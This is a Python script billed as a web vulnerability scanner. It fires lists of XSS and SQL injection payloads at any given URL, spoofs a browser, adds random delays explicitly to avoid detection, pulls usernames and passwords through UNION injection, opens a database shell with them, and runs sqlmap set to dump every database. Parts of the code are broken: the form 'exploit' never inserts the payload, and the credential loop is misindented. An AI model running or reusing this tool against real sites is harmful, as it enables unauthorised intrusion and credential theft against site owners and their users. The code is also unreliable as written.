import requests
from bs4 import BeautifulSoup
import re
import argparse
import os
import time
import random
import subprocess

# Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>",
    "'\"><svg onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\");'></iframe>",
    "';!--\"<XSS>=&{()}",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    "<IMG SRC=`javascript:alert('XSS')`>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<SCRIPT>alert(\"XSS\")</SCRIPT>",
    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "<BODY ONLOAD=alert('XSS')>",
    "<BGSOUND SRC=\"javascript:alert('XSS');\">",
    "<BR SIZE=\"&{alert('XSS')}\">",
    "'>alert(1)</script>",
    "<script src=http://xss.rocks/xss.js></script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert('XSS');</script>",
]

sql_payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "\" OR \"1\"=\"1\" /*",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 'a'='a",
    "' OR ''='",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1' /*",
    "' OR SLEEP(5) --",
    "'; EXEC xp_cmdshell('dir') --",
    "' OR 1=1 LIMIT 1 --",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --",
    "' AND 1=2 UNION SELECT null, version() --",
    "' UNION SELECT null, table_name FROM information_schema.tables --",
    "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --",
    "1 OR 1=1",
    "' OR 1 --",
    "1 OR '1'='1'",
    "' OR 1=1#",
    "1' OR '1'='1",
    "1'1",
    "' OR 1=1--",
]

# Logging
def log_result(filename, message):
    with open(filename, 'a') as f:
        f.write(message + "\n")

# HTTP Headers to mimic a legitimate browser
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

# XSS Check
def check_xss(url, xss_payloads, log_file):
    vulnerabilities = []
    for payload in xss_payloads:
        try:
            r = requests.get(url, params={'q': payload}, headers=headers, timeout=10, verify=False)
            if payload in r.text:
                message = f"Potential XSS vulnerability found with payload: {payload}"
                print(message)
                log_result(log_file, message)
                vulnerabilities.append(payload)
                # Attempt to exploit if form found
                exploit_xss_form(url, payload, log_file)
            else:
                message = f"No XSS vulnerability found with payload: {payload}"
                print(message)
                log_result(log_file, message)
            time.sleep(random.uniform(1, 3))  # Random delay to avoid detection
        except requests.exceptions.RequestException as e:
            message = f"Request failed for XSS payload {payload}: {e}"
            print(message)
            log_result(log_file, message)
    return vulnerabilities

# Attempt to exploit XSS in detected form
def exploit_xss_form(url, payload, log_file):
    try:
        r = requests.get(url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(r.content, 'html.parser')
        form = soup.find('form')
        if form:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            data = {}
            for input_tag in inputs:
                input_name = input_tag.get('name')
                if input_name:
                    data[input_name] = input_name  # Inject payload into all input fields

            if method == 'post':
                r = requests.post(action, headers=headers, data=data, timeout=10, verify=False)
            else:
                r = requests.get(action, headers=headers, params=data, timeout=10, verify=False)

            if payload in r.text:
                message = f"XSS exploitation successful with payload: {payload}"
                print(message)
                log_result(log_file, message)
            else:
                message = f"XSS exploitation unsuccessful with payload: {payload}"
                print(message)
                log_result(log_file, message)
        else:
            message = "No form found to exploit XSS"
            print(message)
            log_result(log_file, message)
    except requests.exceptions.RequestException as e:
        message = f"XSS exploitation failed: {e}"
        print(message)
        log_result(log_file, message)

# SQL Injection Check
def check_sql_injection(url, sql_payloads, log_file):
    vulnerabilities = []
    for payload in sql_payloads:
        try:
            r = requests.get(url, params={'q': payload}, headers=headers, timeout=10, verify=False)
            if re.search(r"(?i)(sql syntax|sql error|database error|mysql_fetch|unknown column|mysql_num_rows|pg_query|SQLite|syntax error)", r.text):
                message = f"Potential SQL Injection vulnerability found with payload: {payload}"
                print(message)
                log_result(log_file, message)
                vulnerabilities.append(payload)
            else:
                message = f"No SQL Injection vulnerability found with payload: {payload}"
                print(message)
                log_result(log_file, message)
            time.sleep(random.uniform(1, 3))  # Random delay to avoid detection
        except requests.exceptions.RequestException as e:
            message = f"Request failed for SQL payload {payload}: {e}"
            print(message)
            log_result(log_file, message)
    return vulnerabilities

# Extensive Testing
def extensive_test(url, payloads, test_type, log_file):
    for payload in payloads:
        try:
            r = requests.get(url, params={'q': payload}, headers=headers, timeout=10, verify=False)
            if test_type == "XSS":
                if payload in r.text:
                    message = f"Exploiting XSS with payload: {payload}"
                    print(message)
                    log_result(log_file, message)
                    exploit_xss_form(url, payload, log_file)
            elif test_type == "SQL":
                if re.search(r"(?i)(sql syntax|sql error|database error|mysql_fetch|unknown column|mysql_num_rows|pg_query|SQLite|syntax error)", r.text):
                    message = f"Exploiting SQL Injection with payload: {payload}"
                    print(message)
                    log_result(log_file, message)
            time.sleep(random.uniform(1, 3))  # Random delay to avoid detection
        except requests.exceptions.RequestException as e:
            message = f"Request failed for {test_type} payload {payload}: {e}"
            print(message)
            log_result(log_file, message)

# Database Access Attempt
def attempt_db_access(url, log_file):
    db_payloads = [
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT null, table_name FROM information_schema.tables --",
        "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --",
    ]
    for payload in db_payloads:
        try:
            r = requests.get(url, params={'q': payload}, headers=headers, timeout=10, verify=False)
            if "username" in r.text and "password" in r.text:
                # Extracting database name and table name dynamically
                database_name = re.search(r"Database: (\w+)", r.text).group(1)
                table_name = re.search(r"Table: (\w+)", r.text).group(1)
                
                credentials = re.findall(r"username:(\w+), password:(\w+)", r.text)
                if credentials:
                    for username, password in credentials:
                    	message = f"Database access successful with username: {username}, password: {password}, database: {database_name}, table: {table_name}"
                print(message)
                log_result(log_file, message)
                open_database_shell(username, password, database_name, table_name)
                return True
            time.sleep(random.uniform(1, 3))  # Random delay to avoid detection
        except requests.exceptions.RequestException as e:
            message = f"Request failed for DB payload {payload}: {e}"
            print(message)
            log_result(log_file, message)
        except AttributeError:
            continue  # Continue to next payload if database or table name not found
    return False

# Open Database Shell
def open_database_shell(username, password, database_name, table_name):
    print("Opening database shell...")
    # Example commands for different database types
    # MySQL
    mysql_command = f"mysql -u {username} -p{password} -h localhost {database_name} -e 'SELECT * FROM {table_name};'"
    # PostgreSQL
    postgres_command = f"psql -U {username} -d {database_name} -c 'SELECT * FROM {table_name};'"
    # MongoDB
    mongo_command = f"mongo --username {username} --password {password} --authenticationDatabase {database_name} --eval 'db.{table_name}.find();'"
    
    # Example usage
    subprocess.run(["gnome-terminal", "--", "bash", "-c", mysql_command])  # For Linux with GNOME Terminal
    # subprocess.run(["cmd", "/c", mysql_command])  # For Windows

# Run sqlmap for extensive SQL Injection testing
def run_sqlmap(url, log_file):
    print("\nRunning sqlmap for advanced SQL Injection testing...")
    try:
        command = f"sqlmap -u {url} --batch --random-agent --level=5 --risk=3 --dbs --dump-all"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        message = f"sqlmap result: {result.stdout}"
        print(message)
        log_result(log_file, message)
    except Exception as e:
        message = f"sqlmap failed: {e}"
        print(message)
        log_result(log_file, message)

# Main Function
def main():
    parser = argparse.ArgumentParser(description='Web Vulnerability Scanner')
    parser.add_argument('url', help='URL to test')
    parser.add_argument('--log', help='Log file to store results', default='vulnerability_report.txt')
    
    args = parser.parse_args()
    url = args.url.strip()
    log_file = args.log

    if not (url.startswith('http://') or url.startswith('https://')):
        url = 'http://' + url

    # Clear the log file
    if os.path.exists(log_file):
        os.remove(log_file)
    
    print("\nChecking for XSS vulnerabilities...")
    xss_vulnerabilities = check_xss(url, xss_payloads, log_file)
    
    if xss_vulnerabilities:
        print("\nPerforming extensive XSS testing...")
        extensive_test(url, xss_vulnerabilities, "XSS", log_file)
    
    print("\nChecking for SQL Injection vulnerabilities...")
    sql_vulnerabilities = check_sql_injection(url, sql_payloads, log_file)
    
    if sql_vulnerabilities:
        print("\nPerforming extensive SQL Injection testing...")
        extensive_test(url, sql_vulnerabilities, "SQL", log_file)
    
    print("\nAttempting database access...")
    if not attempt_db_access(url, log_file):
        print("\nRunning sqlmap for advanced SQL Injection testing...")
        run_sqlmap(url, log_file)
    
    print("\nWeb vulnerability scanning completed. Results are logged in:", log_file)

if __name__ == "__main__":
    main()

